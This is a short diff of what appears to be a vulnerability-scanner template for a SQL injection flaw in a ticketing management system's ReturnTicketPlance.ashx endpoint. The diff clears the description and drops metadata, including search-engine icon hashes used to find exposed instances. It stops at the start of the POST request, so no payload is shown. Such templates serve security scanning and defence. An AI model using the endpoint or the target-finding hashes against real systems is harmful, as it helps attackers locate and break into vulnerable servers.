@@ -3,12 +3,8 @@ info:
   name: 中成科信票务管理系统 ReturnTicketPlance.ashx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ow8pgocn3ckxwglc'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ow8pgocn3ckxwglc
-    fofa: icon_hash="1632964065" || icon_hash="-2142050529"
 http:
 - raw:
   - 'POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
